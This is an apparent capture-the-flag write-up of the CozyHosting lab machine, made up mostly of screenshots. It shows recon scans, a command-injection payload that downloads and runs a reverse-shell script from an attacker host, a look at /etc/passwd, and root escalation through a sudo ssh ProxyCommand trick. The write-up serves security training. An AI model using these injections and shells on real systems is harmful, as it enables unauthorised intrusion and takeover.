...
![Untitled](img/Pasted image 20231002193732.png)

`nmap -sCV -p22,80 10.10.11.230 -oN targeted`

![Untitled](img/Pasted image 20231002193850.png)



`nmap --script=http-enum -p80 10.10.11.230 -oN webContent`

![Untitled](img/Pasted image 20231002194447.png)


`whatweb http://10.10.11.230`

![Untitled](img/Pasted image 20231002194512.png)

It tries to redirect us to http://cozyhosting.htb. Let's add this domain in the **/etc/hosts** file:

![Untitled](img/Pasted image 20231002194841.png)

`whatweb http://cozyhosting.htb`

![Untitled](img/Pasted image 20231002194908.png)
...
![Untitled](img/Pasted image 20231002195046.png)

![Untitled](img/Pasted image 20231002195141.png)

![Untitled](img/Pasted image 20231002195226.png)
...
![Untitled](img/Pasted image 20231002195945.png)
...
![Untitled](img/Pasted image 20231002200717.png)



Nooothing, as the server is using nginx, let's try with the nginx wordlist:

![Untitled](img/Pasted image 20231002201747.png)
...
![Untitled](img/Pasted image 20231002201726.png)

When I click on that icon this page appears:

![Untitled](img/Pasted image 20231002202153.png)
...
![Untitled](img/Pasted image 20231002202351.png)
...
![Untitled](img/Pasted image 20231002202442.png)
...
![Untitled](img/Pasted image 20231002223056.png)
...
![Untitled](img/Pasted image 20231002203517.png)
...
![Untitled](img/Pasted image 20231002223142.png)

Once done, let's try to access to http://cozyhosting.htb/admin

![Untitled](img/Pasted image 20231002223202.png)
...
![Untitled](img/Pasted image 20231013164811.png)
...
![Untitled](img/Pasted image 20231013165040.png)
...
![Untitled](img/Pasted image 20231013170314.png)
...
![Untitled](img/Pasted image 20231013171105.png)
...
![Untitled](img/Pasted image 20231013171037.png)Yeah! Our machine received a ping from the target machine, so we can execute commands in the target machine. Let's try to obtain a reverse shell:

`;wget${IFS}http://10.10.14.7/revshell.sh${IFS}-P${IFS}/tmp;#`

![Untitled](img/Pasted image 20231013173415.png)

Now, let's change the permissions of the file to make it executable:

![Untitled](img/Pasted image 20231013173555.png)



And now, let's try to execute the script! `;/tmp/revshell.sh;#`

![Untitled](img/Pasted image 20231013173623.png)
...
![Untitled](img/Pasted image 20231013174212.png)

Let's take a look to the /etc/pass to see with users are registered with a bash:

![Untitled](img/Pasted image 20231013174255.png)

So,  **josh** and **root**.

![Untitled](img/Pasted image 20231013174827.png)
...
![Untitled](img/Pasted image 20231013181720.png)
...
![Untitled](img/Pasted image 20231013181908.png)

It didn't work for root user, but it did for **josh**.

![Untitled](img/Pasted image 20231013182038.png)
...
![Untitled](img/Pasted image 20231013182202.png)

**josh** can run ssh as **root**! According to gtfobins.io, executing ssh with sudo rights can give us an interactive root shell!



![Untitled](img/Pasted image 20231013182507.png)

`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`

![Untitled](img/Pasted image 20231013182736.png)
